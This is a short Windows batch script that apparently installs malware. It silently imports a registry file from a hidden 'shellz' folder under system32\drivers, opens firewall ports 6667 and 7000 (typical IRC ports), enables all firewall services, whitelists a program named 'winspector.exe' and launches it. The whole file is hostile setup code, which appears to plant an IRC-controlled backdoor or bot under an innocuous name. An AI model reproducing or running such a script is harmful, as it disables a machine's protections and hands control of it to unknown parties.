@echo off
@regedit /s c:\windows\system32\drivers\shellz\sup.reg
@netsh firewall set portopening protocol = all port = 6667 name = winspector mode = enable scope = all profile = all
@netsh firewall set portopening protocol = all port = 7000 name = winspector mode = enable scope = all profile = all
@netsh firewall set service type = all mode = enable scope = all profile = all
@netsh firewall set allowedprogram program = c:\windows\system32\drivers\shellz\winspector.exe mode = enable scope = all profile = all
@c:\windows\system32\drivers\shellz\winspector.lnk
@exit